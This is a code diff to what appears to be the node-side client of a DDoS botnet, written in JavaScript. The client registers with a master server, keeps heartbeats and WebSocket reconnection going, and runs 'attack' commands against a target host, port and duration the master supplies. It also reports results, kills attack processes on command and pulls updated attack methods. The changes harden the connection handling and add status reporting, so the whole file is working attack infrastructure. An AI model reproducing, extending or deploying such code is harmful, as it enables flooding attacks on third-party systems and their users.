@@ -23,6 +23,11 @@ async function fetchWithTimeout(url, options = {}, timeout = 10000) {
   }
 }
 
+// FIX: Helper to safely check if a WebSocket is open — handles null/undefined
+function isWsOpen(ws) {
+  return !!(ws && ws.readyState === WebSocket.OPEN);
+}
+
 function createReverseClient(config, executor, methodsConfig) {
   if (!config || !config.NODE || !config.NODE.ID) {
     console.error('[REVERSE] ERROR: config.NODE.ID is not defined!');
@@ -38,9 +43,11 @@ function createReverseClient(config, executor, methodsConfig) {
   const maxReconnectAttempts = config.REVERSE?.MAX_RECONNECT_ATTEMPTS || 10;
   let lastSuccessfulConnection = null;
 
-  // FIX: Track whether we are currently in a close/error handler to prevent
-  // double-incrementing reconnectAttempts when both 'close' and 'error' fire
-  // for the same disconnection event.
+  // FIX: Track REST registration status separately from WS connection
+  let isRegistered = false;
+
+  // FIX: Flag to prevent double reconnect-attempt increment when both
+  // 'close' and 'error' fire for the same disconnection event.
   let disconnectHandled = false;
 
   const masterDownDetection = {
@@ -89,7 +96,7 @@ function createReverseClient(config, executor, methodsConfig) {
         masterCameBack = true;
         console.log('[REVERSE] ✓ Master is back online!');
 
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
+        if (!isWsOpen(ws)) {
           console.log('[REVERSE] Attempting WebSocket reconnect after master recovery...');
           reconnectAttempts = 0;
           scheduleImmediateReconnect();
@@ -116,11 +123,7 @@ function createReverseClient(config, executor, methodsConfig) {
     console.log('[REVERSE] Forcing WebSocket reconnection...');
 
     if (ws) {
-      try {
-        ws.close();
-      } catch {
-        // ignore
-      }
+      try { ws.close(); } catch { /* ignore */ }
       ws = null;
     }
 
@@ -182,6 +185,21 @@ function createReverseClient(config, executor, methodsConfig) {
     }
   }
 
+  // FIX: Safe ws state reader — returns a consistent object regardless of ws state
+  function getWsState() {
+    if (!ws) {
+      return { readyState: -1, stateName: 'NOT_INITIALIZED', connected: false };
+    }
+    const stateNames = ['CONNECTING', 'OPEN', 'CLOSING', 'CLOSED'];
+    const stateName = stateNames[ws.readyState] || 'UNKNOWN';
+    return {
+      readyState: ws.readyState,
+      stateName,
+      connected: ws.readyState === WebSocket.OPEN,
+      bufferedAmount: ws.readyState === WebSocket.OPEN ? (ws.bufferedAmount || 0) : 0
+    };
+  }
+
   async function getFullStatusForHeartbeat() {
     try {
       const totalMem = os.totalmem();
@@ -195,10 +213,12 @@ function createReverseClient(config, executor, methodsConfig) {
 
       const methodsVersion = getMethodsVersionHash();
       const supportedMethods = Object.keys(currentMethodsConfig);
+      const wsState = getWsState();
 
       return {
         timestamp: new Date().toISOString(),
         mode: 'REVERSE',
+        node_id: config.NODE.ID,
         system: {
           platform: os.platform(),
           arch: os.arch(),
@@ -219,6 +239,7 @@ function createReverseClient(config, executor, methodsConfig) {
         },
         uptime_seconds: uptime,
         active_processes: activeProcesses.length,
+        active_attack_processes: executor.getActiveProcessesCount(),
         methods: {
           version_hash: methodsVersion,
           count: supportedMethods.length,
@@ -226,8 +247,11 @@ function createReverseClient(config, executor, methodsConfig) {
         },
         connection: {
           type: 'reverse',
-          ws_connected: !!(ws && ws.readyState === WebSocket.OPEN),
-          ws_state: ws ? ws.readyState : 'NO_CONNECTION',
+          // FIX: Use consistent ws state object
+          ws_connected: wsState.connected,
+          ws_state: wsState.stateName,
+          ws_readyState: wsState.readyState,
+          registered: isRegistered,
           encryption: isEncryptionEnabled(),
           master_status: masterDownDetection.isMasterDown ? 'down' : 'up',
           consecutive_failures: masterDownDetection.consecutiveFailures,
@@ -245,7 +269,14 @@ function createReverseClient(config, executor, methodsConfig) {
       return {
         timestamp: new Date().toISOString(),
         mode: 'REVERSE',
-        error: error.message
+        node_id: config.NODE.ID,
+        error: error.message,
+        connection: {
+          ws_connected: isWsOpen(ws),
+          ws_state: getWsState().stateName,
+          registered: isRegistered,
+          master_status: masterDownDetection.isMasterDown ? 'down' : 'up',
+        }
       };
     }
   }
@@ -289,11 +320,7 @@ function createReverseClient(config, executor, methodsConfig) {
 
       const res = await fetchWithTimeout(
         `${config.MASTER.URL}/heartbeat`,
-        {
-          method: 'POST',
-          headers,
-          body
-        },
+        { method: 'POST', headers, body },
         10000
       );
       const responseTime = Date.now() - start;
@@ -343,13 +370,8 @@ function createReverseClient(config, executor, methodsConfig) {
       };
     } catch (err) {
       console.error('[REVERSE-HEARTBEAT] Heartbeat error:', err.message);
-
       updateMasterDownStatus(false);
-
-      return {
-        success: false,
-        error: err.message
-      };
+      return { success: false, error: err.message };
     }
   }
 
@@ -390,7 +412,9 @@ function createReverseClient(config, executor, methodsConfig) {
       let body;
       const headers = {
         'Content-Type': 'application/json',
-        'User-Agent': `Node/${config.NODE.ID}`
+        'User-Agent': `Node/${config.NODE.ID}`,
+        'X-Node-Mode': 'REVERSE',
+        'X-Node-ID': config.NODE.ID
       };
 
       if (isEncryptionEnabled()) {
@@ -404,11 +428,7 @@ function createReverseClient(config, executor, methodsConfig) {
 
       const res = await fetchWithTimeout(
         `${config.MASTER.URL}/register`,
-        {
-          method: 'POST',
-          headers,
-          body
-        },
+        { method: 'POST', headers, body },
         15000
       );
 
@@ -428,6 +448,7 @@ function createReverseClient(config, executor, methodsConfig) {
           data = {};
         }
 
+        isRegistered = true;
         console.log('[REVERSE-REGISTER] ✓ Registered successfully to master');
 
         return {
@@ -449,10 +470,7 @@ function createReverseClient(config, executor, methodsConfig) {
       };
     } catch (err) {
       console.error('[REVERSE-REGISTER] Register error:', err.message);
-      return {
-        success: false,
-        error: err.message
-      };
+      return { success: false, error: err.message };
     }
   }
 
@@ -465,9 +483,11 @@ function createReverseClient(config, executor, methodsConfig) {
       const loadAvg = os.loadavg();
       const uptime = os.uptime();
       const activeProcesses = executor.getActiveProcesses();
+      const wsState = getWsState();
 
       return {
         node_id: config.NODE.ID,
+        mode: 'REVERSE',
         system: {
           hostname: os.hostname(),
           platform: os.platform()
@@ -480,18 +500,30 @@ function createReverseClient(config, executor, methodsConfig) {
         },
         uptime_seconds: uptime,
         active_processes: activeProcesses.length,
+        active_attack_processes: executor.getActiveProcessesCount(),
         methods_count: Object.keys(currentMethodsConfig).length,
-        ws_connected: !!(ws && ws.readyState === WebSocket.OPEN),
+        methods_version: getMethodsVersionHash().substring(0, 8),
+        // FIX: Use consistent ws state reader
+        ws_connected: wsState.connected,
+        ws_state: wsState.stateName,
+        registered: isRegistered,
         encryption: isEncryptionEnabled(),
         master_status: masterDownDetection.isMasterDown ? 'down' : 'up',
-        reconnect_attempts: reconnectAttempts
+        consecutive_failures: masterDownDetection.consecutiveFailures,
+        reconnect_attempts: reconnectAttempts,
+        last_heartbeat_success: masterDownDetection.lastHeartbeatSuccess
+          ? new Date(masterDownDetection.lastHeartbeatSuccess).toISOString()
+          : null
       };
     } catch (error) {
       console.error('[REVERSE] Error getting simple status:', error);
       return {
         node_id: config.NODE.ID,
+        mode: 'REVERSE',
         error: error.message,
-        ws_connected: false,
+        ws_connected: isWsOpen(ws),
+        ws_state: getWsState().stateName,
+        registered: isRegistered,
         master_status: 'unknown'
       };
     }
@@ -513,11 +545,7 @@ function createReverseClient(config, executor, methodsConfig) {
           };
         }
         console.log('[REVERSE] Failed to decrypt message:', result.error);
-        return {
-          success: false,
-          error: result.error,
-          raw: parsed
-        };
+        return { success: false, error: result.error, raw: parsed };
       }
 
       if (parsed.envelope === 'plain') {
@@ -538,10 +566,7 @@ function createReverseClient(config, executor, methodsConfig) {
       };
     } catch (error) {
       console.log('[REVERSE] Invalid WebSocket message:', error.message);
-      return {
-        success: false,
-        error: error.message
-      };
+      return { success: false, error: error.message };
     }
   }
 
@@ -553,7 +578,7 @@ function createReverseClient(config, executor, methodsConfig) {
   }
 
   function send(obj) {
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
+    if (!isWsOpen(ws)) {
       console.log('[REVERSE] WS: Cannot send - connection not open');
       return false;
     }
@@ -582,7 +607,7 @@ function createReverseClient(config, executor, methodsConfig) {
 
     if (timeSinceLastSuccess > 300000) {
       console.log(
-        `[REVERSE] WS: Resetting reconnect attempts after long successful connection (${reasonLabel})`
+        `[REVERSE] WS: Resetting reconnect attempts after long absence (${reasonLabel})`
       );
       reconnectAttempts = 0;
       scheduleReconnect();
@@ -619,10 +644,7 @@ function createReverseClient(config, executor, methodsConfig) {
         console.log('[REVERSE] WS: Registration acknowledged by master');
         if (data.master_methods_version) {
           console.log(
-            `[REVERSE] WS: Master methods version: ${data.master_methods_version.substring(
-              0,
-              8
-            )}`
+            `[REVERSE] WS: Master methods version: ${data.master_methods_version.substring(0, 8)}`
           );
         }
         break;
@@ -651,9 +673,7 @@ function createReverseClient(config, executor, methodsConfig) {
           .replaceAll('{port}', String(portNum));
 
         try {
-          const result = await executor.execute(command, {
-            expectedDuration: timeNum
-          });
+          const result = await executor.execute(command, { expectedDuration: timeNum });
           const successResponse = {
             type: 'attack_result',
             requestId,
@@ -666,10 +686,7 @@ function createReverseClient(config, executor, methodsConfig) {
             methods
           };
           sendMaybeEncrypted(successResponse, 'attack_result', encrypted);
-
-          console.log(
-            `[REVERSE] Attack executed: ${target}:${portNum} for ${timeNum}s using ${methods}`
-          );
+          console.log(`[REVERSE] Attack executed: ${target}:${portNum} for ${timeNum}s using ${methods}`);
         } catch (error) {
           const errorResponse = {
             type: 'attack_result',
@@ -681,7 +698,6 @@ function createReverseClient(config, executor, methodsConfig) {
             methods
           };
           sendMaybeEncrypted(errorResponse, 'attack_result', encrypted);
-
           console.error(`[REVERSE] Attack failed: ${error.message}`);
         }
         break;
@@ -709,26 +725,16 @@ function createReverseClient(config, executor, methodsConfig) {
           processId: pidNum
         };
         sendMaybeEncrypted(response, 'kill_result', encrypted);
-
-        console.log(
-          `[REVERSE] Kill process ${processId}: ${killed ? 'success' : 'failed'}`
-        );
+        console.log(`[REVERSE] Kill process ${processId}: ${killed ? 'success' : 'failed'}`);
         break;
       }
 
       case 'kill_all': {
         const { requestId } = data;
         const killed = executor.killAllProcesses();
-        const response = {
-          type: 'kill_all_result',
-          requestId,
-          killed
-        };
+        const response = { type: 'kill_all_result', requestId, killed };
         sendMaybeEncrypted(response, 'kill_all_result', encrypted);
-
-        console.log(
-          `[REVERSE] Kill all processes: ${killed} processes killed`
-        );
+        console.log(`[REVERSE] Kill all processes: ${killed} processes killed`);
         break;
       }
 
@@ -769,9 +775,7 @@ function createReverseClient(config, executor, methodsConfig) {
         const { master_version, method_count, message } = data;
         console.log('[REVERSE] WS: Methods updated notification from master');
         console.log(
-          `[REVERSE] WS: Master version: ${
-            master_version?.substring(0, 8) ?? 'unknown'
-          }, Methods: ${method_count ?? 'unknown'}`
+          `[REVERSE] WS: Master version: ${master_version?.substring(0, 8) ?? 'unknown'}, Methods: ${method_count ?? 'unknown'}`
         );
         if (message) {
           console.log(`[REVERSE] WS: ${message}`);
@@ -798,10 +802,7 @@ function createReverseClient(config, executor, methodsConfig) {
                 }
               }
             } catch (error) {
-              console.error(
-                '[REVERSE] WS: Sync error after notification:',
-                error
-              );
+              console.error('[REVERSE] WS: Sync error after notification:', error);
             }
           }, 2000);
         }
@@ -833,9 +834,7 @@ function createReverseClient(config, executor, methodsConfig) {
     const delay = exponentialDelay + jitter;
 
     console.log(
-      `[REVERSE] WS: Reconnecting in ${Math.round(
-        delay / 1000
-      )} seconds... (attempt ${reconnectAttempts + 1}/${maxReconnectAttempts})`
+      `[REVERSE] WS: Reconnecting in ${Math.round(delay / 1000)}s... (attempt ${reconnectAttempts + 1}/${maxReconnectAttempts})`
     );
 
     reconnectTimeout = setTimeout(() => {
@@ -861,9 +860,7 @@ function createReverseClient(config, executor, methodsConfig) {
     }
 
     console.log(
-      `[REVERSE] WS: Connecting to ${config.MASTER.WS_URL} (attempt ${
-        reconnectAttempts + 1
-      }/${maxReconnectAttempts})`
+      `[REVERSE] WS: Connecting to ${config.MASTER.WS_URL} (attempt ${reconnectAttempts + 1}/${maxReconnectAttempts})`
     );
 
     try {
@@ -889,12 +886,14 @@ function createReverseClient(config, executor, methodsConfig) {
       ws.on('open', async () => {
         console.log('[REVERSE] WS: ✓ Connected to master');
 
-        // FIX: Reset disconnect guard on successful connection
         disconnectHandled = false;
         reconnectAttempts = 0;
         lastSuccessfulConnection = Date.now();
         masterDownDetection.isMasterDown = false;
         masterCameBack = false;
+
+        // FIX: Capture ws reference so we don't use stale ws in the closure
+        const currentWs = ws;
 
         const methodsSupported = Object.keys(currentMethodsConfig);
         const msg = {
@@ -924,7 +923,7 @@ function createReverseClient(config, executor, methodsConfig) {
 
         cleanupPingInterval();
         pingInterval = setInterval(() => {
-          if (ws && ws.readyState === WebSocket.OPEN) {
+          if (isWsOpen(ws)) {
             try {
               ws.ping();
             } catch (error) {
@@ -933,13 +932,20 @@ function createReverseClient(config, executor, methodsConfig) {
           }
         }, 30000);
 
+        // FIX: Only do REST registration if still connected on the same socket
         setTimeout(async () => {
+          // FIX: Guard against stale socket — verify ws is still the same and open
+          if (currentWs !== ws || !isWsOpen(ws)) {
+            console.log('[REVERSE] WS: Socket changed before REST registration, skipping');
+            return;
+          }
           try {
             const registerResult = await registerWithMaster();
             if (registerResult.success) {
               console.log('[REVERSE] ✓ Registered with master via REST API');
 
               setTimeout(async () => {
+                if (!isWsOpen(ws)) return;
                 try {
                   await sendRestHeartbeat();
                 } catch (error) {
@@ -947,10 +953,7 @@ function createReverseClient(config, executor, methodsConfig) {
                 }
               }, 2000);
             } else {
-              console.log(
-                '[REVERSE] ✗ Failed to register via REST API:',
-                registerResult.error
-              );
+              console.log('[REVERSE] ✗ Failed to register via REST API:', registerResult.error);
             }
           } catch (error) {
             console.error('[REVERSE] Register via REST error:', error);
@@ -974,10 +977,11 @@ function createReverseClient(config, executor, methodsConfig) {
         );
 
         cleanupPingInterval();
+        isRegistered = false;
 
         if (isShuttingDown) return;
 
-        // FIX: Prevent double-increment when both 'close' and 'error' fire
+        // FIX: Prevent double-increment
         if (disconnectHandled) return;
         disconnectHandled = true;
 
@@ -997,7 +1001,7 @@ function createReverseClient(config, executor, methodsConfig) {
 
         if (isShuttingDown) return;
 
-        // FIX: Prevent double-increment when both 'error' and 'close' fire
+        // FIX: Prevent double-increment
         if (disconnectHandled) return;
         disconnectHandled = true;
 
@@ -1027,29 +1031,19 @@ function createReverseClient(config, executor, methodsConfig) {
         const result = await sendRestHeartbeat();
 
         if (result.success) {
-          console.log(
-            `[REVERSE] ✓ Background heartbeat sent (${new Date().toLocaleTimeString()})`
-          );
+          console.log(`[REVERSE] ✓ Background heartbeat sent (${new Date().toLocaleTimeString()})`);
 
-          if (masterCameBack && (!ws || ws.readyState !== WebSocket.OPEN)) {
+          if (masterCameBack && !isWsOpen(ws)) {
             masterCameBack = false;
-            console.log(
-              '[REVERSE] Master is back, attempting WebSocket reconnection...'
-            );
+            console.log('[REVERSE] Master is back, attempting WebSocket reconnection...');
             reconnectAttempts = 0;
             scheduleImmediateReconnect();
           }
         } else {
-          console.error(
-            '[REVERSE] ✗ Background heartbeat failed:',
-            result.error
-          );
+          console.error('[REVERSE] ✗ Background heartbeat failed:', result.error);
         }
       } catch (error) {
-        console.error(
-          '[REVERSE] ✗ Background heartbeat error:',
-          error.message
-        );
+        console.error('[REVERSE] ✗ Background heartbeat error:', error.message);
       }
     }
 
@@ -1059,11 +1053,8 @@ function createReverseClient(config, executor, methodsConfig) {
       }
 
       setTimeout(executeHeartbeat, 2000);
-
       heartbeatInterval = setInterval(executeHeartbeat, interval);
-      console.log(
-        `[REVERSE] Started background heartbeat every ${interval}ms`
-      );
+      console.log(`[REVERSE] Started background heartbeat every ${interval}ms`);
     }
 
     function stop() {
@@ -1074,16 +1065,13 @@ function createReverseClient(config, executor, methodsConfig) {
       }
     }
 
-    return {
-      start,
-      stop,
-      execute: executeHeartbeat
-    };
+    return { start, stop, execute: executeHeartbeat };
   }
 
   function shutdown() {
     console.log('[REVERSE] Shutting down...');
     isShuttingDown = true;
+    isRegistered = false;
 
     if (reconnectTimeout) {
       clearTimeout(reconnectTimeout);
@@ -1094,7 +1082,7 @@ function createReverseClient(config, executor, methodsConfig) {
 
     if (ws) {
       try {
-        if (ws.readyState === WebSocket.OPEN) {
+        if (isWsOpen(ws)) {
           const goodbyeMsg = {
             type: 'goodbye',
             node_id: config.NODE.ID,
@@ -1102,19 +1090,14 @@ function createReverseClient(config, executor, methodsConfig) {
           };
 
           if (isEncryptionEnabled()) {
-            const encryptedGoodbye = encryptionManager.createSecureMessage(
-              goodbyeMsg,
-              'goodbye'
-            );
+            const encryptedGoodbye = encryptionManager.createSecureMessage(goodbyeMsg, 'goodbye');
             ws.send(JSON.stringify(encryptedGoodbye));
           } else {
             ws.send(JSON.stringify(goodbyeMsg));
           }
         }
         ws.close();
-      } catch {
-        // ignore
-      }
+      } catch { /* ignore */ }
     }
   }
 
@@ -1128,16 +1111,16 @@ function createReverseClient(config, executor, methodsConfig) {
     startBackgroundHeartbeat,
     updateMethodsConfig,
     shutdown,
-    isConnected: () => !!(ws && ws.readyState === WebSocket.OPEN),
-    getConnectionState: () =>
-      ws
-        ? {
-            readyState: ws.readyState,
-            state: ['CONNECTING', 'OPEN', 'CLOSING', 'CLOSED'][ws.readyState],
-            bufferedAmount: ws.bufferedAmount,
-            reconnectAttempts
-          }
-        : { readyState: -1, state: 'NOT_CONNECTED', reconnectAttempts },
+    // FIX: All status readers use safe isWsOpen helper
+    isConnected: () => isWsOpen(ws),
+    isRegistered: () => isRegistered,
+    getConnectionState: () => ({
+      ...getWsState(),
+      reconnectAttempts,
+      registered: isRegistered,
+      masterDown: masterDownDetection.isMasterDown,
+      consecutiveFailures: masterDownDetection.consecutiveFailures
+    }),
     getMethodsCount: () => Object.keys(currentMethodsConfig).length,
     getMethodsVersion: getMethodsVersionHash,
     isEncryptionEnabled,
